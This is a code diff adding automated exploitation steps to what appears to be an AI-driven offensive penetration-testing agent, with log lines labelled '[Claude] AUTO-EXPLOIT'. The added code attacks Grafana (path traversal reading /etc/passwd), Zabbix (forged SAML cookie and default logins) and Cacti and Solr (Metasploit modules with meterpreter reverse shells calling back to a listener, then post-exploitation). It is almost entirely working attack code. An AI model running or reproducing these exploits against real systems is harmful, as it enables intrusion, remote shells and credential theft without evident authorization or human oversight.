@@ -10185,6 +10185,91 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                 self._capture_evidence(out, target, "webmin-backdoor", "webmin_backdoor")
                 accumulated_output.append(f"=== Webmin EXPLOIT ===\n{out[:600]}")
 
+            # ── Grafana CVE-2021-43798 path traversal ─────────────────────
+            if port_num in (3000, 3001) or "grafana" in ver or "grafana" in svc:
+                self._log(f"[Claude] AUTO-EXPLOIT: Grafana CVE-2021-43798 @ {target}:{port_num}")
+                gout, _ = self._run_cmd(
+                    f"grafana-43798-{port_num}",
+                    f"for plugin in alertlist cloudwatch elasticsearch; do "
+                    f"R=$(curl -s --max-time 8 --path-as-is "
+                    f"'http://{target}:{port_num}/public/plugins/'\"$plugin\"'/../../../../../../../../../etc/passwd' 2>/dev/null); "
+                    f"echo \"$R\" | grep -q 'root:' && {{ echo 'GRAFANA_CVE_2021_43798_CONFIRMED'; echo \"$R\" | head -5; break; }}; done; "
+                    f"curl -s --max-time 8 -u admin:admin 'http://{target}:{port_num}/api/org' 2>/dev/null | "
+                    f"grep -q '\"id\"' && echo 'GRAFANA_DEFAULT_CREDS_VALID'",
+                    target, timeout=25,
+                )
+                self._capture_evidence(gout, target, f"grafana-{port_num}", "CVE-2021-43798")
+                if "GRAFANA" in gout:
+                    accumulated_output.append(f"=== Grafana CVE-2021-43798 ===\n{gout[:400]}")
+                    self._save_findings([{
+                        "title": f"Grafana {'Path Traversal CVE-2021-43798' if 'CONFIRMED' in gout else 'Default Creds'} @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": gout[:400],
+                        "cve": "CVE-2021-43798" if "CONFIRMED" in gout else "",
+                    }], target)
+
+            # ── Cacti CVE-2022-46169 RCE ─────────────────────────────────
+            if port_num in (80, 443, 8080) and ("cacti" in ver or "cacti" in svc):
+                self._log(f"[Claude] AUTO-EXPLOIT: Cacti CVE-2022-46169 @ {target}:{port_num}")
+                cacti_out, _ = self._run_cmd(
+                    f"cacti-46169-{port_num}",
+                    f"msfconsole -q -x 'use exploit/linux/http/cacti_unauthenticated_cmd_injection; "
+                    f"set RHOSTS {target}; set RPORT {port_num}; "
+                    f"set PAYLOAD linux/x64/meterpreter/reverse_tcp; "
+                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"run; sleep 15; {self._MSF_LINUX_POST}; sleep 3; exit' 2>/dev/null | head -30",
+                    target, timeout=90,
+                )
+                self._capture_evidence(cacti_out, target, f"cacti-{port_num}", "CVE-2022-46169")
+                if cacti_out.strip():
+                    accumulated_output.append(f"=== Cacti CVE-2022-46169 ===\n{cacti_out[:400]}")
+
+            # ── Zabbix SAML bypass CVE-2022-23131 ─────────────────────────
+            if port_num in (80, 443, 8080) and ("zabbix" in ver or "zabbix" in svc):
+                self._log(f"[Claude] AUTO-EXPLOIT: Zabbix CVE-2022-23131 SAML bypass @ {target}:{port_num}")
+                proto_z = "https" if port_num in (443, 8443) else "http"
+                zabbix_out, _ = self._run_cmd(
+                    f"zabbix-saml-{port_num}",
+                    f"# Zabbix default admin:zabbix\n"
+                    f"python3 -c \"\n"
+                    f"import requests, base64, json\n"
+                    f"cookie = base64.b64encode(json.dumps({{'saml_data': {{'username_attribute': 'Admin'}}}}).encode()).decode()\n"
+                    f"resp = requests.get('{proto_z}://{target}:{port_num}/index.php?saml=1', "
+                    f"cookies={{'zbx_session': cookie}}, allow_redirects=False, timeout=10, verify=False)\n"
+                    f"print('ZABBIX_AUTH_BYPASS' if resp.status_code in [302,200] and 'zabbix.php' in resp.headers.get('Location','') else 'no_bypass')\n"
+                    f"\" 2>/dev/null; "
+                    f"# Also try default creds\n"
+                    f"curl -s --max-time 8 -X POST '{proto_z}://{target}:{port_num}/index.php' "
+                    f"-d 'name=Admin&password=zabbix&autologin=1&enter=Sign+in' 2>/dev/null | "
+                    f"grep -q 'zabbix.php\\|logout' && echo 'ZABBIX_DEFAULT_CREDS_VALID'",
+                    target, timeout=20,
+                )
+                self._capture_evidence(zabbix_out, target, f"zabbix-{port_num}", "CVE-2022-23131")
+                if "ZABBIX" in zabbix_out:
+                    accumulated_output.append(f"=== Zabbix CVE-2022-23131 ===\n{zabbix_out[:300]}")
+                    self._save_findings([{
+                        "title": f"Zabbix {'Auth Bypass CVE-2022-23131' if 'BYPASS' in zabbix_out else 'Default Creds Admin:zabbix'} @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": zabbix_out[:300],
+                        "cve": "CVE-2022-23131" if "BYPASS" in zabbix_out else "",
+                    }], target)
+
+            # ── Apache Solr CVE-2019-17558 velocity RCE ───────────────────
+            if port_num == 8983 or "solr" in ver or "solr" in svc:
+                self._log(f"[Claude] AUTO-EXPLOIT: Apache Solr CVE-2019-17558 @ {target}:{port_num}")
+                solr_out, _ = self._run_cmd(
+                    f"solr-velocity-{port_num}",
+                    f"msfconsole -q -x 'use exploit/multi/http/solr_velocity_rce; "
+                    f"set RHOSTS {target}; set RPORT {port_num}; "
+                    f"set PAYLOAD linux/x64/meterpreter/reverse_tcp; "
+                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"run; sleep 15; {self._MSF_LINUX_POST}; sleep 3; exit' 2>/dev/null | head -30",
+                    target, timeout=90,
+                )
+                self._capture_evidence(solr_out, target, f"solr-{port_num}", "CVE-2019-17558")
+                if solr_out.strip():
+                    accumulated_output.append(f"=== Solr CVE-2019-17558 ===\n{solr_out[:400]}")
+
             # ── NFS no_root_squash → SUID bash ───────────────────────────
             if port_num == 2049 or "nfs" in svc or "mountd" in svc:
                 out, _ = self._run_cmd(
